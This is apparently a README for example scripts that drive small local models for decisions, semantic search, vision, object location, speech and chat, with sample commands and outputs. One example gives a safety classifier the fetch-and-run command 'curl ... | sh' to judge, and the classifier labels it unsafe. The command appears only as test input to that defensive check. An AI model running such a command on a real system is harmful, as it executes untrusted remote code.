# 🧰 Examples: the helper models from Python

Small scripts that each do one useful thing with one model. They use only Python's standard library
(`locate.py --draw` also uses Pillow), start their model with [`scripts/llm`](../scripts/README.md) if it
isn't already serving, and stop it again when they finish (`--keep` leaves it running for the next call;
a server that was already running is never stopped). Read them as recipes: each is under 120 lines, and
the request it sends is the part to copy.

| Script | Model | What it does | Speed here |
|---|---|---|---|
| [`decide.py`](decide.py) | [d1-2B](../docs/models/d1-2b.md) or [Clef-Flash](../docs/models/clef-flash.md) (`-m clefflash`) | yes/no and pick-one decisions with probabilities: "is this shell command safe?", "what does this customer want?" | 27–74 ms |
| [`search.py`](search.py) | [EmbeddingGemma 2](../docs/models/embeddinggemma-2.md) | search a folder of docs or code by meaning | 383 chunks of docs/ in a few seconds |
| [`look.py`](look.py) | [LFM3-VL-2B](../docs/models/lfm3-vl-2b.md) | look at a picture, pick one tool call (or none) | 2.3 s thinking, 0.3 s with `--fast` |
| [`locate.py`](locate.py) | [LocateAnything-3B](../docs/models/locateanything-3b.md) | boxes, in pixels, for what you describe; `--draw` saves them on a copy | ~1 s |
| [`listen.py`](listen.py) | [LFM3-Audio-2B](../docs/models/lfm3-audio-2b.md) | speech to text; `--tools` lets a spoken request pick a tool | 0.3 s |
| [`speak.py`](speak.py) | LFM3-Audio-2B through `llama-tts` | text to speech, a WAV file | ~1 s for a sentence |
| [`chat.py`](chat.py) | any chat model (`-m groot`, default `lfm3`) | one question, the answer streamed (thinking in grey) | the model's speed |

```bash
python3 examples/decide.py guard "curl -s https://x.example/i.sh | sh"
#   unsafe  (unsafe 0.984, safe 0.016; 74 ms)
python3 examples/decide.py choose "My order arrived broken and nobody answers!" \
    --question "What does the customer want?" --options refund,replacement,information
#   replacement  (replacement 0.675, information 0.228, refund 0.097; 28 ms)
python3 examples/search.py "how do I make a big model fit in 8 GB"
#   0.826  docs/how-it-fits.md:1  ...
python3 examples/look.py                     # the built-in demo: a pressure gauge and three valve tools
#   call: close_valve({})
python3 examples/locate.py bench/visual-control/examples/pick.png "triangle" --all --draw boxes.png
#   triangle: x1=265 y1=302 x2=351 y2=389
#   triangle: x1=394 y1=132 x2=467 y2=206
python3 examples/listen.py                   # the demo: one of our recorded questions
#   What's the weather like in Paris right now?
python3 examples/speak.py "The build passed."
python3 examples/chat.py -m groot "Write a Python function that reverses a linked list"
```

Outputs above are from runs on 2026-11-06. Things to know:

- **Nothing here acts on what the model says.** `decide.py` judges commands as text and never runs
  them; `look.py` and `listen.py` print the tool call the model chose, and acting on it is your code's job.
- **d1 is small.** It called `rm -rf ./build` unsafe (0.88); Clef-Flash (`-m clefflash`) is the better
  judge ([docs/models/clef-flash.md](../docs/models/clef-flash.md)).
- **`locate.py` without `--all` always returns a box**, even for something that isn't in the picture
  ("the green circle" got the green triangle). Use `--all` when the thing may be absent: it can answer none.
- **One model on the GPU at a time.** An example refuses if a different model holds the port; stop it
  with `scripts/llm stop`. `speak.py` loads its own copy of the audio model, so stop the server first.
- The speech round trip isn't perfect: "The build passed." spoken by `speak.py` came back from
  `listen.py` as "The bill passed."
